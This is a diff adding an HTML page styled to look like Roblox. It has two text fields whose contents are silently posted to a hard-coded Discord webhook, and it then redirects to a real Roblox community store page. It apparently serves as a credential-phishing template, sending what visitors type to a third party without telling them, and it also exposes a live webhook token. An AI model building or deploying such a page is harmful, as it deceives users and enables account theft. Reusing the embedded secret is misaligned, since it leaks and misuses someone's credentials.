@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Input Page</title>
+    <style>
+        /* Apply the Builder Font Styles */
+        .builder-font, 
+        .builder-font .h1, 
+        .builder-font .h2, 
+        .builder-font .h3, 
+        .builder-font .h4, 
+        .builder-font .h5, 
+        .builder-font .h6, 
+        .builder-font h1, 
+        .builder-font h2, 
+        .builder-font h3, 
+        .builder-font h4, 
+        .builder-font h5, 
+        .builder-font h6 {
+            font-family: Builder Sans, Helvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif;
+        }
+
+        .builder-font {
+            font-weight: 400;
+        }
+
+        /* Dark Theme */
+        .dark-theme {
+            background-color: #232527;
+            color: #fff;
+        }
+
+        /* Global Styles */
+        body {
+            font-family: HCo Gotham SSm, Helvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif;
+            font-weight: 300;
+            font-size: 16px;
+            width: 100%;
+            height: 100%;
+            min-width: 320px;
+            margin: 0;
+            overflow-y: scroll;
+            background-color: #232527;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Box Sizing */
+        *, :after, :before {
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            text-rendering: auto;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Input Container */
+        .container {
+            background: #2C2F33;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            width: 320px;
+            text-align: center;
+        }
+
+        /* Titles */
+        h2 {
+            margin-bottom: 5px;
+            color: #7289DA;
+            font-weight: 400;
+        }
+
+        /* Input Fields */
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #555;
+            border-radius: 5px;
+            outline: none;
+            font-size: 16px;
+            background: #1E2124;
+            color: white;
+        }
+
+        /* Button */
+        button {
+            background-color: #7289DA;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #5b6eae;
+        }
+    </style>
+</head>
+<body class="dark-theme">
+
+    <div class="container builder-font">
+        <h2>Box 1 Title</h2>
+        <input type="text" id="box1" placeholder="Enter something...">
+        
+        <h2>Box 2 Title</h2>
+        <input type="text" id="box2" placeholder="Enter something...">
+        
+        <button onclick="sendToDiscord()">Send</button>
+    </div>
+
+    <script>
+        function sendToDiscord() {
+            const box1Value = document.getElementById("box1").value;
+            const box2Value = document.getElementById("box2").value;
+
+            if (!box1Value || !box2Value) {
+                return; // Prevents sending empty messages
+            }
+
+            const webhookUrl = "https://discord.com/api/webhooks/1334553192742256731/G2eqR5zfbLnos2IHbS5WLm6Hke7VUYSgigNKmWL7WK2e05PchDvyXmRhtUm7TUTYMMyl"; // Replace with your actual webhook
+            const message = {
+                content: `Box 1: ${box1Value}\nBox 2: ${box2Value}`
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.roblox.com/communities/17371797/Zitros-shop#!/store?nl=true"; // Change this to your desired URL
+                }
+            })
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+
+</body>
+</html>
